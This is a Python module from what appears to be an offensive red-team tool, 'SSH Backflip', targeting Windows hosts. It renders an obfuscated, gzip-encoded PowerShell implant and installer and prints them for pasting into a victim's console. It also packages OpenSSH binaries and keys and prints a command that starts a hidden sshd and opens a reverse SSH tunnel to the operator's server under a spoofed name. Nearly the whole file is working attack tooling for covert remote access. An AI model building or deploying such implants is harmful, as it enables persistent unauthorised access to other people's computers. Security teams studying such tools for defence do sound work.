#!/usr/bin/env python3
# Copyright (c) 2024, Oracle and/or its affiliates.

import os
from pathlib import Path
import shutil
import uuid
import datetime
import jinja2
from . import core, settings

backflipsBaseDir = settings.BACKFLIPS_BASE_DIR
keysDir = Path(f"{backflipsBaseDir}/keys/")
payloadsDir = Path(f"{backflipsBaseDir}/payloads/")
cleanupScriptsDir = Path(f"{backflipsBaseDir}/cleanup/")
forTheWinDir = Path(f"{backflipsBaseDir}/sshbackflip/windows/")
opensshTemplateDir = Path(f"{forTheWinDir}/OpenSSH-Template/")
tempVictimHostKeysDir = Path(f"{forTheWinDir}/etc/ssh/")


def makebackflip(backflipServer, victim, args):
    logging = args.verbose
    payloadUUID = str(uuid.uuid4())
    payloadName = "".join(core.getrandomwords(2))
    spoofServer = args.spoofDomain
    privKeyName = f"{payloadName}k"

    print(f"Logging is {logging}")
    print("\n\n====== ====== ====== SSH Backflip For The Win(dows) ====== ====== ======")
    print(f"[*] Date of backflip invocation: {str(datetime.datetime.now(datetime.timezone.utc))} UTC")
    print ("[*] victim host: %s" % victim.hostname)
    print ("[*] backflipServer name: %s" % backflipServer.name)
    print ("[*] victim port: %s" % victim.port)
    print(f"[*] Payload UUID: {payloadUUID}")


    jinjenv = jinja2.Environment(loader=jinja2.FileSystemLoader("sshbackflip/windows/"))

    implant_template = jinjenv.get_template("implant_template.ps1")
    implant = implant_template.render({
        "marker" : payloadName,
        "faceplant" : victim.username.split("_")[0],
        "remotePort" : victim.port,
        "backflipServer" : backflipServer.name,
        "bsPort": backflipServer.port,
        "flipUser" : backflipServer.user,
        "privKey" : victim.privKey,
        "pubKey" : victim.pubKey,
        "bsHostKey" : backflipServer.hostKey,
        "my_priv_key" : privKeyName
        })

    implant = core.nocomments(implant)

    implant_installer = jinjenv.get_template("install_implant_template.ps1")
    installer = implant_installer.render({"implantBlob" : core.gzbase(implant)})

    installer = core.nocomments(installer)

    print("[+] Paste the following into the victim's PowerShell command line.\n------------------------------------------------\n\n")
    print(installer)
    print("\n\n------------------------------------------------\n")

    print("\n[I] IOCs :")
    print(f"[I] Backflip Public Key [{victim.pubKeyPath}] \n\t|SHA256:{core.getfilehash(f'{victim.pubKeyPath}').hexdigest()} \n\t|MD5:{core.getfilehash_md5(f'{victim.pubKeyPath}').hexdigest()}")
    print(f"[I] Backflip Private Key [{victim.privKeyPath}] \n\t|SHA256:{core.getfilehash(f'{victim.privKeyPath}').hexdigest()} \n\t|MD5:{core.getfilehash_md5(f'{victim.privKeyPath}').hexdigest()}")

    if (args.includeBins):
    # Create a new directory for this victim's payload using a copy of OpenSSH-template
        thisPayloadDir = Path(f"{backflipsBaseDir}/payloads/OpenSSH_{victim.username}-{victim.hostname}-{backflipServer.name}-{str(uuid.uuid4())}")
        thisPayloadDir.mkdir(parents=True, exist_ok=True)
        shutil.copytree(opensshTemplateDir, thisPayloadDir, dirs_exist_ok=True)

        # Generate all the keys we're gonna be needing for this payload
        # Generate new hostkeys and put them in thisPayloadDir/h/
        tempVictimHostKeysDir.mkdir(parents=True, exist_ok=True)
        print ("[*] generating victim Host Keys")
        os.system(f"ssh-keygen -A -f {forTheWinDir}")
        shutil.copytree(tempVictimHostKeysDir, f"{thisPayloadDir}/h/", dirs_exist_ok=True)
        shutil.rmtree(tempVictimHostKeysDir, ignore_errors=True)

        # The same set of keys will be used by the victim to ssh to us as flip and for us to ssh to them
        print ("[*] adding keys to payload for victim to use")
        shutil.copy(f"{victim.pubKeyPath}", f"{thisPayloadDir}/authorized_keys")
        shutil.copy(victim.privKeyPath, f"{thisPayloadDir}/{privKeyName}")

        # Find the hostkey of our server so we can add it to the victim's known hosts (in thisPayloadDir/hks) for StrictHostKeyChecking.
        os.system(f"echo \"{backflipServer.name} $(ssh-keyscan -p {backflipServer.port} -t ed25519 localhost 2>/dev/null | cut -d ' ' -f2-)\">{keysDir}/serverpub.pub")
        # shutil.copy(backflipServer.hostKeyPath, f"{thisPayloadDir}/hks")

        # Update the ssh_config and agent.ps1 files with the desired addresses for spoofing server name in the ssh command
        with open(f"{thisPayloadDir}/ssh_config", "r+") as f:
            content = f.read()
            f.seek(0)
            f.truncate()
            content = content.replace('backflipServer', backflipServer.name)
            content = content.replace('spoofServer', spoofServer)
            content = content.replace('flipUser', backflipServer.user)
            content = content.replace('backflipPort', backflipServer.port)
            content = content.replace('my_priv_key', privKeyName)
            f.write(content)

        with open(f"{thisPayloadDir}/agent.ps1", "r+") as f:
            content = f.read()
            f.seek(0)
            f.truncate()
            content = content.replace('spoofServer', spoofServer)
            content = content.replace('remotePort', str(victim.port))
            content = content.replace('my_priv_key', privKeyName)
            f.write(content)

        thisPayloadZip = shutil.make_archive(f"{payloadsDir}/{payloadName}_OpenSSH", "zip", root_dir=thisPayloadDir)
        shutil.rmtree(thisPayloadDir, ignore_errors=True)
        attackCommand = f'ssh.exe -F $env:AppData\\OpenSSH\\ssh_config -p {backflipServer.port} -N -R {victim.port}:127.0.0.1:22 -i $env:AppData\\OpenSSH\\{privKeyName} -o "LocalCommand=powershell.exe Start-Process $env:AppData\\OpenSSH\\sshd.exe -WindowStyle hidden -WorkingDirectory $env:AppData\\OpenSSH\\ -ArgumentList {{-h $env:AppData\\OpenSSH\\h\\ssh_host_ed25519_key -f $env:AppData\\OpenSSH\\sshd_config_default}} " {backflipServer.user}@{backflipServer.name}'


        print(f"[+] Backflip Payload [{thisPayloadZip}] \n\t|SHA256:{core.getfilehash(thisPayloadZip).hexdigest()} \n\t|MD5:{core.getfilehash_md5(thisPayloadZip).hexdigest()}\n")

        print(f"\n[+] Backflip payload [{payloadsDir}/{payloadName}_OpenSSH.zip] is ready.")
        print(f"\n[I] Deploy the .zip to the victim computer. Unzip the payload to the victim's AppData folder, ie: 'C:\\Users\\Victim\\AppData\\Roaming\\OpenSSH\\' then with PowerShell go to that directory and run this command:\n .\{attackCommand}")

        # sshbacklfip_connect is not ready yet but it will be an alias for ssh reading our custom backfips config, as such it will leverage the 'hostname' that we define to alias each connection
        print(f"\n[I] To connect to the victim run this command: \nsudo sshbackflip_connect {victim.hostname}")
        print(f"\n[I] For Cleanup stop/kill sshd and delete the victim's ~\AppData\Roaming\OpenSSH directory.")
        print(f"\n[+] Have a nice day!")

        return {"payloadName":payloadName, "payloadPath":thisPayloadZip, "attackCommand":attackCommand}




